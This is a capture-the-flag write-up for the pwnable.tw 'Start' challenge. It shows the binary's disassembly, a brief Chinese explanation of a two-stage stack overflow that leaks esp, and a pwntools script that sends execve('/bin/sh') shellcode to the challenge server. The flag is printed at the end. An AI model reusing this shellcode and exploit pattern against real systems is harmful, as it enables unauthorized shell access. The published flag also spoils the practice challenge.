# Start [100 pts]

```
Arch:     i386-32-little
RELRO:    No RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      No PIE (0x8048000)
```

## concept

```asm
08048060 <_start>:
8048060:       54                      push   esp
8048061:       68 9d 80 04 08          push   0x804809d
8048066:       31 c0                   xor    eax,eax
8048068:       31 db                   xor    ebx,ebx
804806a:       31 c9                   xor    ecx,ecx
804806c:       31 d2                   xor    edx,edx
804806e:       68 43 54 46 3a          push   0x3a465443
8048073:       68 74 68 65 20          push   0x20656874
8048078:       68 61 72 74 20          push   0x20747261
804807d:       68 73 20 73 74          push   0x74732073
8048082:       68 4c 65 74 27          push   0x2774654c
8048087:       89 e1                   mov    ecx,esp
8048089:       b2 14                   mov    dl,0x14
804808b:       b3 01                   mov    bl,0x1
804808d:       b0 04                   mov    al,0x4
804808f:       cd 80                   int    0x80
8048091:       31 db                   xor    ebx,ebx
8048093:       b2 3c                   mov    dl,0x3c
8048095:       b0 03                   mov    al,0x3
8048097:       cd 80                   int    0x80
8048099:       83 c4 14                add    esp,0x14
804809c:       c3                      ret
```

首先可以利用 overflow (0x14 bytes) 蓋掉 return address 跳到 ```0x08048087```  接著就可以 leak 出 esp，再 overflow 一次將 return address 蓋為 ```esp + 0x14``` 後面接上 shellcode 即可成功開 shell 囉。

## exploit

```python
#!/usr/bin/env python

from pwn import *

# r = process('./start')
r = remote('chall.pwnable.tw', 10000)

context.arch = 'i386'

shellcode = "\x31\xc0\x99\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

r.recvuntil(':')
r.send('a' * 0x14 + p32(0x08048087))
ret = u32(r.recv()[:4]) + 0x14
log.info(hex(ret))

r.send('a' * 0x14 + p32(ret) + shellcode)

r.interactive()
```

## flag

```FLAG{Pwn4bl3_tW_1s_y0ur_st4rt}```
